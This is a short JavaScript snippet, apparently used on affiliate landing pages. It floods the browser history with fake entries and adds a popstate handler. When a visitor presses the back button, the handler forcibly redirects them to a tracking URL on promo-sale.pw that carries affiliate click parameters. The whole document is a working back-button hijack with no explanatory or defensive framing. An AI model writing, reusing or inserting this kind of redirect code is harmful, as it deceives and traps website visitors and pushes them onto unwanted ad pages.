! function () {
    var t;
    try {
        const URL = window.location.href.split(/[#]/)[0];
        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
        onpopstate = function(event){
            event.state && location.replace('https://promo-sale.pw/click.php?key=a0cdi3xr507hkj7spveb&clickid={clickid}&cost={bid}&t1={t1}&feed_id={feed_id}&utm_source=backbutton&utm_content={utm_content}&utm_term={utm_term}&utm_medium=Yaroslav&utm_campaign=3132_backbutton_partnerka_landings_campaign');
        }
    } catch (o) { console.log( o ); }
}();